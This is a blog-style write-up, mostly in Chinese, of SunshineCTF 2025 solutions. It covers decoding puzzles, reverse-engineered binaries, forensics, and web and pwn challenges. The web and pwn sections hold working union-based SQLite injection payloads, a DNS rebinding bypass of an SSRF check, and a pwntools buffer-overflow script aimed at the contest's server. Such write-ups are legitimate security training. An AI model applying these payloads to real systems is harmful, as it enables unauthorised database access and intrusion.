---
title: SunshineCTF2025 Writeup
date: 2025-09-27T22:29:49+08:00
tags:
---

感觉比较新手友好

Update: 被拉爆了。隔了一天做出来的题全变10pts了

# [Welcome] Is it seriously this easy?

Just welcome them.

略 `sun{this_is_the_flag}`

# [Welcome] Prizes?

略 `sun{i_read_the_rules_for_every_ctf}`

# [Misc] Tribble with my Skin

> My Minecraft account got hacked and now my skin seems to be a little off...
> 
> Might be having trouble with the tribbles...
> 
> Mind checking it out? My Minecraft username is "oatzs".

Just search for the username's skin on [NameMC](https://namemc.com/) and download the skin file.

`sun{tribble_craft}`

# [Misc] OK BOOMER

> `7778866{844444777_7446666633_444777_26622244433668}`

有点创意，数字代表的是九键输入的操作。不过`777`代表`s`而不是`r`，不太明白。

`sun{this_phone_is_ancient}`



# [Misc] BigMak

> I tried typing out the flag for you, but our Astronaut Coleson seems to have changed the terminal's keyboard layout? He went out to get a big mak so I guess we're screwed. Whatever, here's the flag, if you can somehow get it back to normal.
> 
> rlk{blpdfp_iajylg_iyi}

首先肯定是一个Keyboard Layout，在[这里](https://keyshorts.com/blogs/blog/44712961-how-to-identify-laptop-keyboard-localization)找到了Colemak English keyboard layout，![](https://cdn.shopify.com/s/files/1/0810/3669/files/colemak-windows-keyboard-layout-keyshorts_1024x1024.png?3916)

直接对应替换即可。`sun{burger_layout_lol}`

# [Misc] the poop challenge

文件，一行8个💩，那肯定不止这个，用010 Editor打开发现除了`F0 9F 92 A9`（💩）之外还有`E2 80 8B`（​）

那很好办了，直接`F0 9F 92 A9 E2 80 8B`替换成`1`，`F0 9F 92 A9`替换成`0`，然后转ASCII

[得到了](https://lab.tonycrane.cc/CyberChef/#recipe=From_Binary('CRLF',8)&input=MDExMTAwMTENCjAxMTEwMTAxDQowMTEwMTExMA0KMDExMTEwMTENCjAxMTAxMTAwDQowMTEwMDEwMQ0KMDExMTAwMTENCjAxMTEwMDExDQowMTExMDAxMQ0KMDExMDAxMTENCjAxMTAxMTExDQowMTEwMTExMQ0KMDExMDExMTENCjAxMDExMTExDQowMTExMDAxMQ0KMDExMDExMTENCjAxMTAxMTAwDQowMTExMDExMA0KMDExMDAxMDENCjAxMTAwMTAwDQowMTAxMTExMQ0KMDExMTAxMDANCjAxMTAxMDAwDQowMTEwMDEwMQ0KMDEwMTExMTENCjAxMTEwMDAwDQowMTEwMTExMQ0KMDExMDExMTENCjAxMTEwMDAwDQowMTAxMTExMQ0KMDExMDAwMTENCjAxMTAxMDAwDQowMTEwMDAwMQ0KMDExMDExMDANCjAxMTAxMTAwDQowMTEwMDEwMQ0KMDExMDExMTANCjAxMTAwMTExDQowMTEwMDEwMQ0KMDAxMDAwMDENCjAxMTExMTAx&ieol=CRLF&oeol=CRLF) `sun{lesssgooo_solved_the_poop_challenge!}`



# [Re] BASEic

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  size_t v3; // rax
  size_t v4; // rax
  char *s1; // [rsp+8h] [rbp-58h]
  char s2[14]; // [rsp+12h] [rbp-4Eh] BYREF
  char s[56]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v9; // [rsp+58h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  strcpy(s2, "yX0I0NTM1fQ==");
  printf("What is the flag> ");
  __isoc99_scanf("%40s", s);
  if ( strlen(s) == 22 )
  {
    v3 = strlen(s);
    s1 = (char *)sub_12C6(s, v3);
    if ( !strncmp(s1, "c3Vue2MwdjNyMW5nX3V", 0x13uLL) )
    {
      v4 = strlen(s2);
      if ( !strncmp(s1 + 19, s2, v4) )
        puts("You got it, submit the flag!");
      else
        puts("Soo Close");
    }
    else
    {
      puts("Closer");
    }
    free(s1);
  }
  else
  {
    puts("You don't get the flag that easily");
  }
  return 0LL;
}
```

BASE64 Decode `c3Vue2MwdjNyMW5nX3V` + `yX0I0NTM1fQ==` = `sun{c0v3r1ng_ur_B4535}`

# [Re] Missioncritical1

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v4[64]; // [rsp+0h] [rbp-98h] BYREF
  char s[56]; // [rsp+40h] [rbp-58h] BYREF
  unsigned __int64 v6; // [rsp+78h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  sprintf(v4, "sun{%s_%s_%s}\n", "e4sy", "s4t3ll1t3", "3131");
  time(0LL);
  printf("Satellite Status: Battery=%d%%, Orbit=%d, Temp=%dC\n", 80LL, 32LL, 4294967271LL);
  printf("Enter satellite command: ");
  fgets(s, 50, stdin);
  if ( !strcmp(s, v4) )
    puts("Access Granted!");
  else
    puts("Access Denied!");
  return 0LL;
}
```

just `{% raw %}printf("sun{%s_%s_%s}\n", "e4sy", "s4t3ll1t3", "3131");{% endraw %}` we have `sun{e4sy_s4t3ll1t3_3131}`


# [Re] Roman Romance

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 i; // [rsp+68h] [rbp-28h]
  FILE *stream; // [rsp+70h] [rbp-20h]
  __int64 size; // [rsp+78h] [rbp-18h]
  _BYTE *ptr; // [rsp+80h] [rbp-10h]
  FILE *s; // [rsp+88h] [rbp-8h]

  stream = fopen("flag.txt", "r+b");
  fseek(stream, 0LL, 2);
  size = ftell(stream);
  rewind(stream);
  ptr = malloc(size);
  if ( ptr )
  {
    if ( fread(ptr, 1uLL, size, stream) == size )
    {
      for ( i = 0LL; i < size; ++i )
        ++ptr[i];
      fclose(stream);
      s = fopen("enc.txt", "w");
      if ( fwrite(ptr, 1uLL, size, s) == size )
      {
        free(ptr);
        fclose(s);
        puts(a38213900m);
        puts("/*************************************************************************************\\ \n");
        puts("  MWAHAAHAHAH SAY GOOD-BYTE TO YOUR FLAG ROMAN FILTH!!!!! >:) ");
        puts("  OUR ENCRYPTION METHOD IS TOO STRONG TO BREAK. YOU HAVE TO PAY US >:D ");
        puts("  PAY 18.BTC TO THE ADDRESS 1BEER4MINERSMAKEITRAINCOINSHUNT123 TO GET YOUR FLAG BACK,  ");
        puts("  OR WE SACK ROME AND I TAKE HONORIA'S HAND IN MARRIAGE! SIGNED, ATTILA THE HUN.  \n");
        puts("/*************************************************************************************\\ \n");
        return 0;
      }
      else
      {
        perror("fwrite");
        free(ptr);
        fclose(s);
        return 1;
      }
    }
    else
    {
      perror("fread");
      free(ptr);
      fclose(stream);
      return 1;
    }
  }
  else
  {
    fwrite("malloc failed\n", 1uLL, 0xEuLL, stderr);
    fclose(stream);
    return 1;
  }
}
```

just do the following

```
>>> "".join([chr(ord(c)-1) for c in s])
'sunshine{kN0w_y0u4_r0m@n_hI5t0rY}'
```


# [Re] ExceLLM

这道题很创新啊 之前没见过。

给了一个xlsx文件，里面有4个表（有3个都隐藏了）

大致是，输入一个字符串，
- 在BITS表中，每个字符对应一个8位的二进制数组
- 在WEIGHTS表中，有许多权重数据
- 在Verify表中，有一个计算过程，大致是：首先`=MAX(0,(SUMPRODUCT(BITS!B2:B9,WEIGHTS!A2:A9)+WEIGHTS!A10)/100)`，然后`=--((SUMPRODUCT(C10:C17,WEIGHTS!A18:A25)+WEIGHTS!A26)/100>0)`（双层神经网络说是
- 最后`=--(SUM(H10,H30,H50,H70,H90,H110,H130,H150,H170,H190,H210,H230,H250,H270,H290,H310,H330,H350,H370,H390,H410,H430,H450,H470,H490,H510,H530)=27)`，也就是说这些计算结果都要是1

做起来还是很好做的，爆破即可

```python
# w1 = [
# [-15,  55,  28,  12,  -42,  -42,  -54,  45],
# [12,  -351,  -73,  97,  280,  -54,  -209,  -39],
# [-24,  -335,  -54,  137,  262,  -60,  -165,  1],
# [-5,  -287,  -49,  249,  334,  -391,  -161,  -40],
# [-53,  -305,  6,  -47,  -710,  401,  364,  -7],
# [-46,  -263,  -62,  -64,  -606,  734,  180,  16],
# [6,  -244,  7,  158,  430,  181,  -187,  69],
# [-50,  -234,  -60,  222,  455,  -251,  -84,  -18],

# ]

# w2 = [

# -27,
# -527,
# -99,
# 217,
# -384,
# 577,
# 94,
# -19


# ]

# w3 = [

# -81,
# -493,
# 3,
# -1303,
# 1185,
# -777,
# -322,
# -63

# ]

# w4 = -1060

# Now you need to read file for data above.

lines = open('wt.txt', 'r').readlines()
# This file is separated by lines, in lines with Tab '\t' separated values


lineptr = 0
while True:

    w1 = []
    for i in range(8):
        w1.append([int(x) for x in lines[lineptr+i].strip().split('\t')])
    lineptr += 8
    w2 = [int(x) for x in lines[lineptr:lineptr+8]]
    lineptr += 8
    w3 = [int(x) for x in lines[lineptr:lineptr+8]]
    lineptr += 8
    w4 = int(lines[lineptr].strip())
    lineptr += 2

    # print("Loaded w1,w2,w3,w4:", w1, w2, w3, w4)


    # 1. bruteforce 0~255. use the bit number to generate a array w0
    for i in range(48,128):
        w0 = [((i >> j) & 1)  for j in range(8)]
        w0.reverse()
        # print(w0)

        # print([sum(w1_row[j] * w0[ii] for  ii,w1_row in enumerate(w1))  for j in range(8) ])

        # step 1: f[] = each row of w1 dot w0 + w2
        a = [[w1_row[j] for w1_row in w1] for j in range(8)]
        # print(a)
        f = [max(sum(a[j][ii] * w0[ii] for ii in range(8)) + w2[j], 0) /100  for j in range(8) ]
        # step 2: g = f[] * w3 + w4
        # print(f)
        g = sum(f[ii] * w3[ii] for ii in range(8)) + w4
        # print(i, chr(i), g)
        if g>0:
            print("found!", i, chr(i), g)
            # break
    # break
    # print("round done=================",lineptr)

    if lineptr > len(lines):
        break
"""
found! 115 s 1169.5099999999975
found! 117 u 1244.9899999999975
found! 110 n 1216.9899999999998
found! 123 { 1088.8900000000067
found! 110 n 1216.9899999999998
found! 48 0 1041.38
found! 116 t 1144.5200000000004
found! 95 _ 1190.21
found! 113 q 1134.88
found! 117 u 1244.9899999999975
found! 49 1 1066.27
found! 116 t 1144.5200000000004
found! 51 3 1164.6199999999992
found! 95 _ 1190.21
found! 99 c 1127.0799999999995
found! 104 h 1073.5500000000002
found! 52 4 1065.98
found! 116 t 1144.5200000000004
found! 95 _ 1190.21
found! 71 G 1031.12
found! 80 P 1049.33
found! 84 T 1040.75
found! 95 _ 1190.21
found! 108 l 1119.9199999999983
found! 48 0 1041.38
found! 108 l 1119.9199999999983
found! 125 } 1151.75
"""
```

`sun{n0t_qu1t3_ch4tGPT_l0l}`

# [Re] Palatine Pack

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rax
  void *v4; // rsp
  char v6[8]; // [rsp+8h] [rbp-80h] BYREF
  int i; // [rsp+10h] [rbp-78h]
  int n; // [rsp+14h] [rbp-74h]
  FILE *stream; // [rsp+18h] [rbp-70h]
  __int64 v10; // [rsp+20h] [rbp-68h]
  char *s; // [rsp+28h] [rbp-60h]
  __int64 v12; // [rsp+30h] [rbp-58h]
  __int64 v13; // [rsp+38h] [rbp-50h]
  void *ptr; // [rsp+40h] [rbp-48h]
  FILE *v15; // [rsp+48h] [rbp-40h]
  unsigned __int64 v16; // [rsp+50h] [rbp-38h]

  v16 = __readfsqword(0x28u);
  puts("\nMay Jupiter strike you down Caeser before you seize the treasury!! You will have to tear me apart");
  puts("for me to tell you the flag to unlock the Roman Treasury and fund your civil war. I, Lucius Caecilius");
  puts("Metellus, shall not let you pass until you get this password right. (or threaten to kill me-)\n");
  stream = fopen("palatinepackflag.txt", "r");
  fseek(stream, 0LL, 2);
  n = ftell(stream) + 1;
  fseek(stream, 0LL, 0);
  v10 = n - 1LL;
  v3 = 16 * ((n + 15LL) / 0x10uLL);
  while ( v6 != &v6[-(v3 & 0xFFFFFFFFFFFFF000LL)] )
    ;
  v4 = alloca(v3 & 0xFFF);
  if ( (v3 & 0xFFF) != 0 )
    *(_QWORD *)&v6[(v3 & 0xFFF) - 8] = *(_QWORD *)&v6[(v3 & 0xFFF) - 8];
  s = v6;
  fgets(v6, n, stream);
  flipBits((__int64)s, n);
  v12 = expand(s, (unsigned int)n);
  v13 = expand(v12, (unsigned int)(2 * n));
  ptr = (void *)expand(v13, (unsigned int)(4 * n));
  for ( i = 0; i < 8 * n; ++i )
    putchar(*((unsigned __int8 *)ptr + i));
  putchar(10);
  v15 = fopen("flag.txt", "wb");
  fwrite(ptr, 1uLL, 8 * n, v15);
  fclose(v15);
  return 0;
}

__int64 __fastcall flipBits(__int64 a1, int a2)
{
  __int64 result; // rax
  char v3; // [rsp+13h] [rbp-9h]
  _BOOL4 v4; // [rsp+14h] [rbp-8h]
  unsigned int i; // [rsp+18h] [rbp-4h]

  v4 = 0;
  v3 = 105;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i >= a2 )
      break;
    if ( v4 )
    {
      *(_BYTE *)((int)i + a1) ^= v3;
      v3 += 32;
    }
    else
    {
      *(_BYTE *)((int)i + a1) = ~*(_BYTE *)((int)i + a1);
    }
    v4 = !v4;
  }
  return result;
}

_BYTE *__fastcall expand(__int64 a1, int a2)
{
  unsigned __int8 v3; // [rsp+1Bh] [rbp-15h]
  _BOOL4 v4; // [rsp+1Ch] [rbp-14h]
  int i; // [rsp+20h] [rbp-10h]
  _BYTE *v6; // [rsp+28h] [rbp-8h]

  v4 = 0;
  v3 = 105;
  v6 = malloc(2 * a2);
  for ( i = 0; i < a2; ++i )
  {
    if ( v4 )
    {
      v6[2 * i] = (v3 >> 4) | *(_BYTE *)(i + a1) & 0xF0;
      v6[2 * i + 1] = (16 * v3) | *(_BYTE *)(i + a1) & 0xF;
    }
    else
    {
      v6[2 * i] = (16 * v3) | *(_BYTE *)(i + a1) & 0xF;
      v6[2 * i + 1] = (v3 >> 4) | *(_BYTE *)(i + a1) & 0xF0;
    }
    v3 *= 11;
    v4 = !v4;
  }
  printf("fie");
  return v6;
}
```

除此之外还有几个函数：`rotate_block_left`，`rotate_block_right`，`do_something_wierd`，但是没用到。

同构：

```python
import sys

def flipBits(data):
    v4 = False
    v3 = 105
    result = bytearray(len(data))
    for i in range(len(data)):
        if v4:
            result[i] = data[i] ^ v3
            v3 = (v3 + 32) % 256
        else:
            result[i] = data[i] ^ 0xFF  # ~operation equivalent to XOR 0xFF
        v4 = not v4
    return bytes(result)

def expand(data):
    v4 = False
    v3 = 105
    n = len(data)
    result = bytearray(2 * n)
    for i in range(n):
        byte_val = data[i]
        if v4:
            result[2*i] = (v3 >> 4) | (byte_val & 0xF0)
            result[2*i+1] = ((v3 << 4) & 0xFF) | (byte_val & 0x0F)
        else:
            result[2*i] = ((v3 << 4) & 0xFF) | (byte_val & 0x0F)
            result[2*i+1] = (v3 >> 4) | (byte_val & 0xF0)
        v3 = (v3 * 11) % 256
        v4 = not v4
    return bytes(result)

def main():
    print("\nMay Jupiter strike you down Caeser before you seize the treasury!! You will have to tear me apart")
    print("for me to tell you the flag to unlock the Roman Treasury and fund your civil war. I, Lucius Caecilius")
    print("Metellus, shall not let you pass until you get this password right. (or threaten to kill me-)\n")
    
    try:
        with open("palatinepackflag.txt", "rb") as file:
            file.seek(0, 2)
            file_size = file.tell()
            file.seek(0, 0)
            n = file_size + 1
            s = bytearray(n)
            file.readinto(s)
            s = s[:file_size] + b'\x00'  # Ensure null-terminated
    except FileNotFoundError:
        print("Error: palatinepackflag.txt not found")
        return
    
    # Process the data
    flipped = flipBits(s)
    expanded1 = expand(flipped)
    expanded2 = expand(expanded1)
    expanded3 = expand(expanded2)
    
    # Output results
    sys.stdout.buffer.write(expanded3)
    sys.stdout.buffer.write(b'\n')
    
    with open("flag.txt", "wb") as out_file:
        out_file.write(expanded3)

if __name__ == "__main__":
    main()
```

让deepseek写解密脚本

```python
def unflipBits(data):
    v4 = False
    v3 = 105
    result = bytearray(len(data))
    for i in range(len(data)):
        if v4:
            result[i] = data[i] ^ v3
            v3 = (v3 + 32) % 256
        else:
            result[i] = data[i] ^ 0xFF  # 逆转取反操作
        v4 = not v4
    return bytes(result)

def shrink(data):
    v4 = False
    v3 = 105
    n = len(data) // 2  # 输出长度是输入的一半
    result = bytearray(n)
    
    for i in range(n):
        b1 = data[2*i]
        b2 = data[2*i+1]
        
        if v4:
            # 逆转expand中的模式2
            original_byte = (b1 & 0xF0) | (b2 & 0x0F)
        else:
            # 逆转expand中的模式1
            original_byte = (b2 & 0xF0) | (b1 & 0x0F)
        
        result[i] = original_byte
        v3 = (v3 * 11) % 256
        v4 = not v4
    
    return bytes(result)

def decrypt_flag(encrypted_data):
    # 逆向3次expand操作（即3次shrink）
    data = shrink(encrypted_data)  # 第一次shrink
    data = shrink(data)            # 第二次shrink
    data = shrink(data)            # 第三次shrink
    
    # 逆向flipBits操作
    original_data = unflipBits(data)
    
    # 移除加密时添加的额外空字节
    return original_data.rstrip(b'\x00')

# 从flag.txt读取加密数据
with open('flag.txt', 'rb') as f:
    encrypted_data = f.read()

# 解密数据
decrypted_data = decrypt_flag(encrypted_data)

# 将解密结果保存到palatinepackflag.txt
with open('palatinepackflag.txt', 'wb') as f:
    f.write(decrypted_data)

print("解密完成！原始内容已保存到 palatinepackflag.txt")
```

得到`sunshine{C3A5ER_CR055ED_TH3_RUB1C0N}`


# [Forensics] t0le t0le

OLE Object.

给了一个docx文档，拆开来找到一个`word/embeddings/oleObject1.bin`，里面找到这么个字符串：`Zmhhe2cweXJfZzB5cl96bF9vM3kwaTNxIX0=`，先base64再rot13得到`sun{t0le_t0le_my_b3l0v3d!}`

# [Forensics] Pretty Delicious Food

> something else is out of place too.

然后给了一个PDF文档，很难不让人想到找streams

加上他确实有一个引人入胜的stream：

```
3 0 obj
<< /Names [ (payload.txt) 6 0 R ] >>
endobj
```

不过提取的过程卡了一下，没想到`binwalk -e file.pdf`就能直接提取出来。

流内容：`const data = 'c3Vue3AzM3BfZDFzX2ZsQGdfeTAhfQ==';`，base64解码得到`sun{p33p_d1s_fl@g_y0!}`

# [Web] Lunar Auth

很签了

访问`https://comet.sunshinectf.games/`，看见页面上 *Robot Protocol Automated agents are forbidden — human captains only.*

想到访问`/robots.txt`，得到`Disallow: /admin`，访问，查看源代码
```js
    const real_username = atob("YWxpbXVoYW1tYWRzZWN1cmVk");
    const real_passwd   = atob("UzNjdXI0X1BAJCR3MFJEIQ==");
```
base64解码得到`alimuhammadsecured`和`S3cur4_P@$$w0RD!`，登录成功。
`sun{cl1ent_s1d3_auth_1s_N3V3R_a_g00d_1d3A_983765367890393232}`

不太像人类（

# [Web] Intergalactic Webhook Service

经典DNS Rebinding。

```python
    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return jsonify({'error': reason}), 400
    try:
        resp = requests.post(url, timeout=5, allow_redirects=False)
        return jsonify({'url': url, 'status': resp.status_code, 'response': resp.text}), resp.status_code
```

```python
def is_ip_allowed(url):
    parsed = urlparse(url)
    host = parsed.hostname or ''
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return False, f'Could not resolve host'
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
    return True, None
```
IP验证很严格，基本肯定绕不过去

尝试DNS Rebinding，概率出结果。

`sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}`（爆率真的很低）

# [Web] Lunar Shop

SQLi。`/product?product_id=3`

但是给了报错。

后端是SQLite，因为sleep函数用不了，而且`information_schema.tables`也没有，但是有`sqlite_master`


先尝试`3 union select 1,1，...,1 --`试出表的列数是4

然后尝试`999 union select * from products where name glob '*flag*' --`以及一些变体，没有成功

猜可能在其它表中，直接猜`flag`，`999 union select *,1,1 from flag --`，成功

`sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}`

## Things to takeoff

**关于SQLite3中的`sqlite_master`表。**

等同于`information_schema.tables`，存储数据库中所有表的信息。（这个hacktricks上没写到，可以记一下）

```
type|name|tbl_name|rootpage|sql
table|data|data|2|CREATE TABLE xx (a integer,b blob)
```
- `type`：表的类型，通常是`table`或`index`。
- `name`：表的名称。
- `tbl_name`：表的名称，通常与`name`相同。
- `rootpage`：表在数据库文件中的根页号。
- `sql`：创建表的SQL语句。

具体的使用和hacktricks上写的是相通的。

具体到本题中，可以`999 union select 1,tbl_name,sql,4 from sqlite_master where type='table' --`也可以知道表名flag,`CREATE TABLE flag ( id INTEGER PRIMARY KEY AUTOINCREMENT, flag TEXT NOT NULL UNIQUE )`

# [i95] Maimi

TRIVIAL pwn

```c
int vuln()
{
  __int64 v1[8]; // [rsp+0h] [rbp-50h] BYREF
  int v2; // [rsp+40h] [rbp-10h]
  int v3; // [rsp+4Ch] [rbp-4h]

  v3 = -559038737;
  memset(v1, 0, sizeof(v1));
  v2 = 0;
  printf("Enter Dexter's password: ");
  gets(v1);
  if ( v3 != 322420958 )
    return puts("Invalid credentials!");
  puts("Access granted...");
  return read_flag();
}
```

```python
from pwn import *

# 设置目标，可以是本地二进制或远程服务
# 如果运行本地二进制，使用 process
# p = process('./vuln_binary')  # 请将 vuln_binary 替换为实际二进制文件名

# 如果连接远程服务，使用 remote（替换 IP 和端口）
p = remote('chal.sunshinectf.games', 25601)

# 等待程序输出提示符
p.recvuntil(b"Enter Dexter's password: ")

# 计算偏移量：从 v1 数组开始到 v3 变量的距离为 0x4C 字节
offset = 0x4C
# 需要写入 v3 的值：322420958（十六进制为 0x1337c0de）
value = 322420958

# 构造 Payload：偏移量字节的填充数据，后跟小端格式的 value
payload = b'A' * offset + p32(value)

# 发送 Payload
p.sendline(payload)

# 接收程序输出（包括 flag）
response = p.recvall()
print(response.decode())

# 关闭连接
p.close()
```

`sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}`